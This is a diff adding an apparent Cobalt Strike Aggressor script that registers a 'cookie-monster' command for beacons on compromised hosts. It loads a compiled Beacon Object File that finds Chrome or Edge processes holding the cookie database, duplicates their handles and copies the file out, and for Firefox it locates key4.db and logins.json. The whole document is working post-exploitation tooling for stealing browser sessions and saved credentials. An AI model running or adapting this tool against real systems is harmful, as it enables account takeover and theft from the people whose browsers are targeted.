@@ -1,0 +1,116 @@
+# Example BOF cookie-monster  BOF 
+# The alias cookie-monster is used to locate and copy the cookie file used for Edge/Chrome/Firefox
+# Usage: cookie-monster
+#
+# Example:
+#    cookie-monster
+#
+
+beacon_command_register(
+"cookie-monster",
+"Locate and copy the cookie file used for Edge/Chrome/Firefox",
+"Usage: cookie-monster [ --chrome || --edge || --firefox || --chromepid <pid> || --edgepid <pid> ] \
+cookie-monster Example: \
+   cookie-monster --chrome \
+   cookie-monster --edge \
+   cookie-moster --firefox \
+   cookie-monster --chromepid 1337 \
+   cookie-monster --edgepid 4444 \
+cookie-monster Options: \
+    --chrome, looks at all running processes and handles, if one matches chrome.exe it copies the handle to cookies and then copies the file to the CWD \
+    --edge, looks at all running processes and handles, if one matches msedge.exe it copies the handle to cookies and then copies the file to the CWD \
+    --firefox, looks for profiles.ini and locates the key4.db and logins.json file \
+    --chromepid, if chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and cookie file \
+    --edgepid, if edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and cookie file \
+    ");
+
+# $1 - beacon id
+# $2 - args
+
+alias cookie-monster {
+    local('$handle $data $args $chrome $edge $firefox $all');
+
+    # read in our BOF file...   
+    $handle = openf(script_resource("cookie-monster-bof.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    if(strlen($data) == 0)
+    {
+        berror($1, "could not read bof file");
+        return;
+    }
+
+    # declare variables
+    $chrome = 1;
+    $edge = 1;
+    $firefox = 1;
+    $chromepid = 1;
+    $edgepid = 1;
+    $pid = 1;
+
+    for ($i = 1; $i < size(@_); $i++)
+    {
+        if (@_[$i] eq "--chrome")
+        {
+            $chrome = 0;
+        }
+        else if (@_[$i] eq "--edge")
+        {
+            $edge = 0;
+        }
+        else if (@_[$i] eq "--firefox")
+        {
+            $firefox = 0;
+        }
+        else if (@_[$i] eq "--chromepid")
+        {
+            $chromepid = 0;
+            # get PID
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --chromepid PID value");
+                return;
+            }
+            # set the revert time
+            $pid = @_[$i];
+            if(!-isnumber $pid || $pid eq "1")
+                {
+                    berror($1, "Invalid PID: " . $pid);
+                    return;
+                }
+        }
+        else if (@_[$i] eq "--edgepid")
+        {
+            $edgepid = 0;
+            # get PID
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --edgepid PID value");
+                return;
+            }
+            # set the revert time
+            $pid = @_[$i];
+            if(!-isnumber $pid || $pid eq "1")
+                {
+                    berror($1, "Invalid PID: " . $pid);
+                    return;
+                }
+        }
+        else {
+            berror($1, "NONE OF THE OPTIONS SELECTED");
+            return;
+        }
+    }
+
+    if ( $chrome == 1 && $edge == 1 && $firefox == 1 && $chromepid == 1 && $edgepid == 1 && $pid == 1){
+        berror($1, "NO OPTIONS SELECTED");
+        return;
+    }
+    
+    $args = bof_pack($1, "iiiiii", $chrome, $edge, $firefox, $chromepid, $edgepid, $pid );
+    beacon_inline_execute($1, $data, "go", $args);
+
+}
